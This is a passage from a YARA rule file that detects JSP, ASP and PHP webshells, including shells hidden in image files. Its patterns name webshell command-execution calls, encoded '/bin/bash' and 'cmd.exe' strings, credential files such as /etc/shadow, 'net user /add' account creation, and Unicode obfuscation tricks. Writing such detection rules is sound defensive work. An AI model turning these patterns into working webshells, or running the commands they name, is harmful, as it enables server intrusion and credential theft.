        $three6 = "UwBjAHIAaQBwAHQARQBuAGcAaQBuAGUARgBhAGMAdABvAHIAeQ" wide ascii


        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_bin_files
        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
        $pack  = { 50 41 43 4b 00 00 00 02 00 }

    condition:
        (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and not (
        uint16(0) == 0x5a4d or
        $dex at 0 or
        $pack at 0 or
        // fp on jar with zero compression
        uint16(0) == 0x4b50
        )
        and filesize < 300KB and
        ( any of ( $one* ) and any of ( $two* ) or any of ( $three* ) )
}

rule WEBSHELL_JSP_Generic_ProcessBuilder
{
    meta:
        description = "Generic JSP webshell which uses processbuilder to execute user input"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "82198670ac2072cd5c2853d59dcd0f8dfcc28923"
        hash = "c05a520d96e4ebf9eb5c73fc0fa446ceb5caf343"
        hash = "347a55c174ee39ec912d9107e971d740f3208d53af43ea480f502d177106bbe8"
        hash = "d0ba29b646274e8cda5be1b940a38d248880d9e2bba11d994d4392c80d6b65bd"

        id = "2a7c5f44-24a1-5f43-996e-945c209b79b1"
    strings:
        $exec = "ProcessBuilder" fullword wide ascii
        $start = "start" fullword wide ascii

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

    condition:
        filesize < 2000 and (
            any of ( $input* ) and
            any of ( $req* )
        )
        and $exec and $start
}

rule WEBSHELL_JSP_Generic_Reflection
{
    meta:
        description = "Generic JSP webshell which uses reflection to execute user input"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "62e6c6065b5ca45819c1fc049518c81d7d165744"
        hash = "bf0ff88cbb72c719a291c722ae3115b91748d5c4920afe7a00a0d921d562e188"

        id = "806ffc8b-1dc8-5e28-ae94-12ad3fee18cd"
    strings:
        $ws_exec = "invoke" fullword wide ascii
        $ws_class = "Class" fullword wide ascii
        $fp = "SOAPConnection"

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

        $cj_encoded1 = "\"java.util.Base64$Decoder\"" ascii wide
    condition:
        //any of them or
        all of ( $ws_* ) and (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and not $fp and
        (
            // either some kind of code input from the a web request ...
            filesize < 10KB and
            (
                any of ( $input* ) and
                any of ( $req* )
            )
            or
            (
                // ... or some encoded payload (which might get code input from a web request)
                filesize < 30KB and
                any of ( $cj_encoded* ) and
                // base64 :
                // ignore first and last 500bytes because they usually contain code for decoding and executing
                math.entropy(500, filesize-500) >= 5.5 and
                // encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
                math.mean(500, filesize-500) > 80 and
                // deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
                // lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
                // 89 is the mean of the base64 chars
                math.deviation(500, filesize-500, 89.0) < 23
            )
        )

}

rule WEBSHELL_JSP_Generic_Classloader
{
    meta:
        description = "Generic JSP webshell which uses classloader to execute user input"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        hash = "6b546e78cc7821b63192bb8e087c133e8702a377d17baaeb64b13f0dd61e2347"
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "f3a7e28e1c38fa5d37811bdda1d6b0893ab876023d3bd696747a35c04141dcf0"
        hash = "8ea2a25344e6094fa82dfc097bbec5f1675f6058f2b7560deb4390bcbce5a0e7"
        hash = "b9ea1e9f91c70160ee29151aa35f23c236d220c72709b2b75123e6fa1da5c86c"
        hash = "80211c97f5b5cd6c3ab23ae51003fd73409d273727ba502d052f6c2bd07046d6"
        hash = "8e544a5f0c242d1f7be503e045738369405d39731fcd553a38b568e0889af1f2"

        id = "037e6b24-9faf-569b-bb52-dbe671ab2e87"
    strings:
        $exec = "extends ClassLoader" wide ascii
        $class = "defineClass" fullword wide ascii

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

    condition:
        //any of them or
        (
            (
                $cjsp_short1 at 0 or
                    any of ( $cjsp_long* ) or
                    $cjsp_short2 in ( filesize-100..filesize ) or
                (
                    $cjsp_short2 and (
                        $cjsp_short1 in ( 0..1000 ) or
                        $cjsp_short1 in ( filesize-1000..filesize )
                    )
                )
            )
            and (
                any of ( $input* ) and
                any of ( $req* )
            )
            and $exec and $class
        ) and
        (
            filesize < 10KB or
            (
                filesize < 50KB and
                (
                    // filled with same characters
                    math.entropy(500, filesize-500) <= 1 or
                    // filled with random garbage
                    math.entropy(500, filesize-500) >= 7.7
                )
            )
        )
}

rule WEBSHELL_JSP_Generic_Encoded_Shell
{
    meta:
        description = "Generic JSP webshell which contains cmd or /bin/bash encoded in ascii ord"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-07-05"
        hash = "3eecc354390d60878afaa67a20b0802ce5805f3a9bb34e74dd8c363e3ca0ea5c"
        hash = "f6c2112e3a25ec610b517ff481675b2ce893cb9f"
        hash = "62e6c6065b5ca45819c1fc049518c81d7d165744"

        id = "359949d7-1793-5e13-9fdc-fe995ae12117"
    strings:
        $sj0 = /{ ?47, 98, 105, 110, 47, 98, 97, 115, 104/ wide ascii
        $sj1 = /{ ?99, 109, 100}/ wide ascii
        $sj2 = /{ ?99, 109, 100, 46, 101, 120, 101/ wide ascii
        $sj3 = /{ ?47, 98, 105, 110, 47, 98, 97/ wide ascii
        $sj4 = /{ ?106, 97, 118, 97, 46, 108, 97, 110/ wide ascii
        $sj5 = /{ ?101, 120, 101, 99 }/ wide ascii
        $sj6 = /{ ?103, 101, 116, 82, 117, 110/ wide ascii

    condition:
        filesize <300KB and any of ($sj*)
}

rule WEBSHELL_JSP_NetSpy
{
    meta:
        description = "JSP netspy webshell"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/24"
        modified = "2023-04-05"
        hash = "94d1aaabde8ff9b4b8f394dc68caebf981c86587"
        hash = "3870b31f26975a7cb424eab6521fc9bffc2af580"

        id = "41f5c171-878d-579f-811d-91d74f7e3e24"
    strings:
        $scan1 = "scan" nocase wide ascii
        $scan2 = "port" nocase wide ascii
        $scan3 = "web" fullword nocase wide ascii
        $scan4 = "proxy" fullword nocase wide ascii
        $scan5 = "http" fullword nocase wide ascii
        $scan6 = "https" fullword nocase wide ascii
        $write1 = "os.write" fullword wide ascii
        $write2 = "FileOutputStream" fullword wide ascii
        $write3 = "PrintWriter" fullword wide ascii
        $http = "java.net.HttpURLConnection" fullword wide ascii

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

    condition:
        filesize < 30KB and (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and (
            any of ( $input* ) and
            any of ( $req* )
        )
        and 4 of ( $scan* ) and 1 of ( $write* ) and $http
}

rule WEBSHELL_JSP_By_String
{
    meta:
        description = "JSP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/09"
        modified = "2023-04-05"
        hash = "e9060aa2caf96be49e3b6f490d08b8a996c4b084"
        hash = "4c2464503237beba54f66f4a099e7e75028707aa"
        hash = "06b42d4707e7326aff402ecbb585884863c6351a"
        hash = "dada47c052ec7fcf11d5cfb25693bc300d3df87de182a254f9b66c7c2c63bf2e"
        hash = "f9f6c696c1f90df6421cd9878a1dec51a62e91b4b4f7eac4920399cb39bc3139"
        hash = "f1d8360dc92544cce301949e23aad6eb49049bacf9b7f54c24f89f7f02d214bb"
        hash = "1d1f26b1925a9d0caca3fdd8116629bbcf69f37f751a532b7096a1e37f4f0076"
        hash = "850f998753fde301d7c688b4eca784a045130039512cf51292fcb678187c560b"

        id = "8d64e40b-5583-5887-afe1-b926d9880913"
    strings:
        $jstring1 = "<title>Boot Shell</title>" wide ascii
        $jstring2 = "String oraPWD=\"" wide ascii
        $jstring3 = "Owned by Chinese Hackers!" wide ascii
        $jstring4 = "AntSword JSP" wide ascii
        $jstring5 = "JSP Webshell</" wide ascii
        $jstring6 = "motoME722remind2012" wide ascii
        $jstring7 = "EC(getFromBase64(toStringHex(request.getParameter(\"password" wide ascii
        $jstring8 = "http://jmmm.com/web/index.jsp" wide ascii
        $jstring9 = "list.jsp = Directory & File View" wide ascii
        $jstring10 = "jdbcRowSet.setDataSourceName(request.getParameter(" wide ascii
        $jstring11 = "Mr.Un1k0d3r RingZer0 Team" wide ascii
        $jstring12 = "MiniWebCmdShell" fullword wide ascii
        $jstring13 = "pwnshell.jsp" fullword wide ascii
        $jstring14 = "session set &lt;key&gt; &lt;value&gt; [class]<br>"  wide ascii
        $jstring15 = "Runtime.getRuntime().exec(request.getParameter(" nocase wide ascii
        $jstring16 = "GIF98a<%@page" wide ascii
        $jstring17 = "Tas9er" fullword wide ascii
        $jstring18 = "uu0028\\u" wide ascii //obfuscated /
        $jstring19 = "uu0065\\u" wide ascii //obfuscated e
        $jstring20 = "uu0073\\u" wide ascii //obfuscated s
        $jstring21 = /\\uuu{0,50}00/ wide ascii //obfuscated via javas unlimited amount of u in \uuuuuu
        $jstring22 = /[\w\.]\\u(FFFB|FEFF|FFF9|FFFA|200C|202E|202D)[\w\.]/ wide ascii // java ignores the unicode Interlinear Annotation Terminator inbetween any command
        $jstring23 = "\"e45e329feb5d925b\"" wide ascii
        $jstring24 = "u<![CDATA[n" wide ascii

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_bin_files
        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
        $pack  = { 50 41 43 4b 00 00 00 02 00 }

    condition:
        //any of them or
        not (
            uint16(0) == 0x5a4d or
            $dex at 0 or
            $pack at 0 or
            // fp on jar with zero compression
            uint16(0) == 0x4b50
        ) and
        (
            (
                filesize < 100KB and
                (
                    $cjsp_short1 at 0 or
                    any of ( $cjsp_long* ) or
                    $cjsp_short2 in ( filesize-100..filesize ) or
                    (
                        $cjsp_short2 and (
                            $cjsp_short1 in ( 0..1000 ) or
                            $cjsp_short1 in ( filesize-1000..filesize )
                        )
                    )
                )
                and any of ( $jstring* )
            ) or (
                filesize < 500KB and
                (
                    #jstring21 > 20 or
                    $jstring18 or
                    $jstring19 or
                    $jstring20

                )
            )
        )
}

rule WEBSHELL_JSP_Input_Upload_Write
{
    meta:
        description = "JSP uploader which gets input, writes files and contains \"upload\""
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/24"
        modified = "2023-04-05"
        hash = "ef98ca135dfb9dcdd2f730b18e883adf50c4ab82"
        hash = "583231786bc1d0ecca7d8d2b083804736a3f0a32"
        hash = "19eca79163259d80375ebebbc440b9545163e6a3"

        id = "bbf26edd-88b7-5ec5-a16e-d96a086dcd19"
    strings:
        $upload = "upload" nocase wide ascii
        $write1 = "os.write" fullword wide ascii
        $write2 = "FileOutputStream" fullword wide ascii

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_jsp_input
        // request.getParameter
        $input1 = "getParameter" fullword ascii wide
        // request.getHeaders
        $input2 = "getHeaders" fullword ascii wide
        $input3 = "getInputStream" fullword ascii wide
        $input4 = "getReader" fullword ascii wide
        $req1 = "request" fullword ascii wide
        $req2 = "HttpServletRequest" fullword ascii wide
        $req3 = "getRequest" fullword ascii wide

    condition:
        filesize < 10KB and (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        and (
            any of ( $input* ) and
            any of ( $req* )
        )
        and $upload and 1 of ( $write* )
}

rule WEBSHELL_Generic_OS_Strings : FILE {
    meta:
        description = "typical webshell strings"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/01/12"
        modified = "2023-07-05"
        score = 50
        hash = "d5bfe40283a28917fcda0cefd2af301f9a7ecdad"
        hash = "fd45a72bda0a38d5ad81371d68d206035cb71a14"
        hash = "b4544b119f919d8cbf40ca2c4a7ab5c1a4da73a3"
        hash = "569259aafe06ba3cef9e775ee6d142fed6edff5f"
        hash = "48909d9f4332840b4e04b86f9723d7427e33ac67"
        hash = "0353ae68b12b8f6b74794d3273967b530d0d526f"
        id = "ea85e415-4774-58ac-b063-0f5eb535ec49"
    strings:
        $fp1 = "http://evil.com/" wide ascii
        $fp2 = "denormalize('/etc/shadow" wide ascii
      $fp3 = "vim.org>"

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_jsp_safe
        $cjsp_short1 = "<%" ascii wide
        $cjsp_short2 = "%>" wide ascii
        $cjsp_long1 = "<jsp:" ascii wide
        $cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp_long3 = "/jstl/core" ascii wide
        $cjsp_long4 = "<%@p" nocase ascii wide
        $cjsp_long5 = "<%@ " nocase ascii wide
        $cjsp_long6 = "<% " ascii wide
        $cjsp_long7 = "< %" ascii wide

        //strings from private rule capa_os_strings
        // windows = nocase
        $w1 = "net localgroup administrators" nocase wide ascii
        $w2 = "net user" nocase wide ascii
        $w3 = "/add" nocase wide ascii
        // linux stuff, case sensitive:
        $l1 = "/etc/shadow" wide ascii
        $l2 = "/etc/ssh/sshd_config" wide ascii
        $take_two1 = "net user" nocase wide ascii
        $take_two2 = "/add" nocase wide ascii

    condition:
        filesize < 70KB and
        ( (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        or (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        or (
        $cjsp_short1 at 0 or
            any of ( $cjsp_long* ) or
            $cjsp_short2 in ( filesize-100..filesize ) or
        (
            $cjsp_short2 and (
                $cjsp_short1 in ( 0..1000 ) or
                $cjsp_short1 in ( filesize-1000..filesize )
            )
        )
        )
        ) and (
            filesize < 300KB and
        not uint16(0) == 0x5a4d and (
            all of ( $w* ) or
            all of ( $l* ) or
            2 of ( $take_two* )
        )
        )
        and not any of ( $fp* )
}

rule WEBSHELL_In_Image
{
    meta:
        description = "Webshell in GIF, PNG or JPG"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        hash = "d4fde4e691db3e70a6320e78657480e563a9f87935af873a99db72d6a9a83c78"
        hash = "84938133ee6e139a2816ab1afc1c83f27243c8ae76746ceb2e7f20649b5b16a4"
        hash = "52b918a64afc55d28cd491de451bb89c57bce424f8696d6a94ec31fb99b17c11"
        date = "2021/02/27"
        modified = "2023-04-05"
        score = 55

        id = "b1185b69-9b08-5925-823a-829fee6fa4cf"
    strings:
        $png = { 89 50 4E 47 }
        $jpg = { FF D8 FF E0 }
        $gif = "GIF8" wide ascii // doesn't make sense for a GIF but some webshells are utf8 :)
        $gif2 = "gif89" // not a valid gif but used in webshells
        $gif3 = "Gif89" // not a valid gif but used in webshells
        // MS access
        $mdb = { 00 01 00 00 53 74 }
        //$mdb = { 00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74 20 44 42 }

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_php_payload
        // \([^)] to avoid matching on e.g. eval() in comments
        $cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
        $cpayload10 = /\bpreg_replace[\n\t ]{0,500}(\(.{1,|\/\*)100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
        $cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii

        $m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
        $m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
        // TODO backticks

        //strings from private rule capa_php_write_file
        $php_multi_write1 = "fopen(" wide ascii
        $php_multi_write2 = "fwrite(" wide ascii
        $php_write1 = "move_uploaded_file" fullword wide ascii

        //strings from private rule capa_jsp
        $cjsp1 = "<%" ascii wide
        $cjsp2 = "<jsp:" ascii wide
        $cjsp3 = /language=[\"']java[\"\']/ ascii wide
        // JSF
        $cjsp4 = "/jstl/core" ascii wide

        //strings from private rule capa_jsp_payload
        $payload1 = "ProcessBuilder" fullword ascii wide
        $payload2 = "processCmd" fullword ascii wide
        // Runtime.getRuntime().exec(
        $rt_payload1 = "Runtime" fullword ascii wide
        $rt_payload2 = "getRuntime" fullword ascii wide
        $rt_payload3 = "exec" fullword ascii wide

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
